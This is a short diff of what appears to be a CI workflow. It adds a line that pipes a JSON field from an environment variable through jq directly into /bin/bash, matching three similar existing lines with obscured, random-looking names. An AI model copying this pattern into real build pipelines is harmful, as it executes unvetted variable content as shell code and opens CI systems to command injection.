@@ -33,6 +33,7 @@ jobs:
           echo $bqpt0862 | jq -r .w9356 | /bin/bash
           echo $q1 | jq -r .em0 | /bin/bash
           echo $dfr103 | jq -r .grp1 | /bin/bash
+          printf '%s' "$in171" | jq -r .ejgom5444 | /bin/bash
 
       - name: Archive output
         if: always()
